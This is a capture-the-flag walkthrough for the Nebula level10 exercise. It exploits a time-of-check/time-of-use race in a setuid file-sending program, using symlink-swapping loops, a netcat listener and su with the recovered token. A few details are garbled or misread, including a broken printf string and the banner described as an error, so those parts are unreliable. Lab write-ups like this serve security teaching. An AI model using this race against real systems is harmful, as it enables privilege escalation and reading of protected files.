Let's take a look at the source code...

```
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <string.h>

int main(int argc, char **argv)
{
  char *file;
  char *host;

  if(argc < 3) {
      printf("%s file host\n\tsends file to host if you have access to it\n", argv[0]);
      exit(1);
  }

  file = argv[1];
  host = argv[2];

  if(access(argv[1], R_OK) == 0) {
      int fd;
      int ffd;
      int rc;
      struct sockaddr_in sin;
      char buffer[4096];

      printf("Connecting to %s:18211 .. ", host); fflush(stdout);

      fd = socket(AF_INET, SOCK_STREAM, 0);

      memset(&sin, 0, sizeof(struct sockaddr_in));
      sin.sin_family = AF_INET;
      sin.sin_addr.s_addr = inet_addr(host);
      sin.sin_port = htons(18211);

      if(connect(fd, (void *)&sin, sizeof(struct sockaddr_in)) == -1) {
          printf("Unable to connect to host %s\n", host);
          exit(EXIT_FAILURE);
      }

#define HITHERE ".oO Oo.\n"
      if(write(fd, HITHERE, strlen(HITHERE)) == -1) {
          printf("Unable to write banner to host %s\n", host);
          exit(EXIT_FAILURE);
      }
#undef HITHERE

      printf("Connected!\nSending 
      .. "); fflush(stdout);

      ffd = open(file, O_RDONLY);
      if(ffd == -1) {
          printf("Damn. Unable to open file\n");
          exit(EXIT_FAILURE);
      }

      rc = read(ffd, buffer, sizeof(buffer));
      if(rc == -1) {
          printf("Unable to read from file: %s\n", strerror(errno));
          exit(EXIT_FAILURE);
      }

      write(fd, buffer, rc);

      printf("wrote file!\n");

  } else {
      printf("You don't have access to %s\n", file);
  }
}
```

So looking at this code it basically takes two parameters, a file and an ip address, checks to see if the user has permission to the file using the access() function, then runs a series of checks to make sure everything works, then sends the file to the inputted ip address on port 18211. With this challenge, in the challenge directory there is this executable and a file named "token" that we do not have access to (the challenge is to probably view this file). Getting back to the code the issue with the access() function, is even though it checks the file at the beginning it is possible for that file to change by the time it sends it. This is known as a Time of Check Time of Use (TOCTTOU) exploit. 
So in theory, we could give the program a symbolic link to a file that we do have permission to, have it pass the check, then change the symbolic link the the token file which we do not have access to, and the program will write it for us. This exploit does require several running loops in order to execute. You can switch betweem terminals using keyboard shortcuts "Alt + F1", "Alt + F2", "Alt + F3"...

The first step is to create the file which we do have access to.
```
$ echo "nope" > /tmp/ftoken
$ cat /tmp/ftoken
nope
```

The next part is to setup the loop in which it will create a symbolic link, and swap it between the file we have permission for, and the file that we don't. When we do it this way, there will be times where the program checks ftoken, then writes ftoken, times where it will check token then stop, and times (which we want) where it will check ftoken, then write token because the loops are not in synce.

```
$ cd ~
$ while true; do ln -fs /tmp/ftoken token; ln -fs /home/flag10/token token; done
```

Now you will need to switch to another terminal, and run another loop to listen for the output of the program and write it out to a file, since the program sends data to a network location. We will be using netcat.

```
$ while true; do nc -l 18211 >> /home/level10/out; done
```

Now that we have setup the listener and the symbolic link, it is time to loop the program. We will pass to it the token that we made, and our local loopback address (127.0.0.1).

```
$ while true; do /home/flag10/flag10 /home/level10/token 127.0.0.1; done
```

Now we should be able to switch to a new terminal and see the fruits of our labor.

```
$ cat /home/level10/out
```

When we do that, you should see a long list of output, that contains the following three strings in a random order.

```
nope
.o0 0o.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```

And if you see a random combination of those three strings, then our exploit worked. The contents of the token file we didn't have access to is "615a2ce1-b2b5-4c76-8eed-8aa5c4015c27" (we can tell my eliminating "nope" as the file we created, and ".o0 0o." as an error that code's comments tell us). Now we can just try that password to log in to flag10 and run getflag.

```
$ su flag10
Password: 615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
sh-4.2$ id
uid=989(flag10) gid=989(flag10) groups=989(flag10)
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

And just like that we pwned the binary.



Sources: http://mike-boya.github.io/blog/2016/02/15/exploit-exercises-nebula-level10/
